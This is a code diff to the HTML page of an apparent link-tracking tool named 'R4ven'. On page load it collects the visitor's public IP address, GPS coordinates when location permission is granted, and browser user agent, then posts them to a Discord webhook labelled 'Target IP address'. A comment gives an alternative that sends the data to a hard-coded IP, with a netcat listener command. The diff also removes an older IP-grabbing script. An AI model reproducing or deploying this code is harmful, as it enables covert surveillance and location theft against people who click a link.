@@ -13,9 +13,36 @@
 </iframe>
 
 <p id="demo"></p>
-
+<script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+</script>
 <script>
 var x = document.getElementById("demo");
+
+$.getJSON("https://api.ipify.org?format=json", function(data) {
+  $("#gfg").html(data.ip);
+
+  const request = new XMLHttpRequest();
+      request.open("POST", discord.webhook); //change webhook
+
+      request.setRequestHeader('Content-type', 'application/json');
+
+      var myEmbed = {
+        author: {
+          name: "Someone clicked the link !!"
+        },
+        title: "Target IP address",
+        description: data.ip
+      }
+
+      var params = {
+        username: "R4ven",
+        avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
+        embeds: [ myEmbed ]
+      }
+
+      request.send(JSON.stringify(params));
+})
 
 function getLocation() {
   if (navigator.geolocation) {
@@ -26,20 +53,29 @@ function getLocation() {
 }
 
 function showPosition(position) {
-  var latlong = (" GET " , "Latitude: " + position.coords.latitude + "\nLongitude: " + position.coords.longitude + "\nUagent: " + navigator.userAgent);
+  var latlong = (" GET " , "__**Gps Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude + "\n\n__**Uagent:**__ " + navigator.userAgent);
   
   const request = new XMLHttpRequest();
       request.open("POST", discord.webhook); //change webhook
 
       request.setRequestHeader('Content-type', 'application/json');
 
-      const params = {
+      var myEmbed = {
+        author: {
+          name: "Allowed location PERMISSION !!"
+        },
+        title: "Fetched information...",
+        description: latlong
+      }
+
+      var params = {
         username: "R4ven",
         avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
-        content: latlong
+        embeds: [ myEmbed ]
       }
 
       request.send(JSON.stringify(params));
+
 //document.location='http://192.168.13.175:4321/'+latlong;
 // use netcat to listen (nc -nlvp portnumber) (don’t forget to chnage ip and portnumber)
 // and yeah that's random ip 😏
@@ -62,25 +98,5 @@ function showError(error) {
   }
 }
 </script>
-<script>
-  function getIP(json) {
-    var ip = ("GET", "---\nIp-address: " + json.ip)
-
-    const request = new XMLHttpRequest();
-      request.open("POST", discord.webhook); //change webhook
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      const params = {
-        username: "R4ven",
-        avatar_url: "https://i.pinimg.com/originals/27/bb/72/27bb72f7f7085f9c81153ce6c7bc2605.jpg",
-        content: ip
-      }
-
-      request.send(JSON.stringify(params));
-
-  }
-  </script>
-<script src="http://api.ipify.org?format=jsonp&callback=getIP"></script>
 </body>
 </html>
